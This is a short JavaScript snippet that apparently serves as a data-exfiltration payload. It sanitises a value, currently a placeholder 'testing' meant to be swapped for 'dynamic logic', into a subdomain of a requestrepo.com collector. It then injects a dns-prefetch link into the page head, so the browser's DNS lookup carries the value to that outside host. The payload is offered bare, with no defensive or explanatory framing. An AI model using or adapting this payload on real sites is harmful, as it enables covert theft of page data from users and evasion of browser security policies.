(function() {
    const q = "testing"; // Replace with your dynamic logic
    
    // 1. Sanitize for DNS (Subdomain rules)
    const sanitizedQ = String(q)
        .toLowerCase()
        .replace(/[^a-z0-9]/g, '')
        .substring(0, 63);

    if (sanitizedQ.length > 0) {
        const targetUrl = `//${sanitizedQ}.qycrk5z4.requestrepo.com`;

        // 2. Create the link element
        const link = document.createElement('link');
        link.rel = 'dns-prefetch';
        link.href = targetUrl;

        // 3. Inject into Head
        document.head.appendChild(link);
        
        console.log(`[DNS-HINT] Hint injected for: ${targetUrl}`);
    }
})();
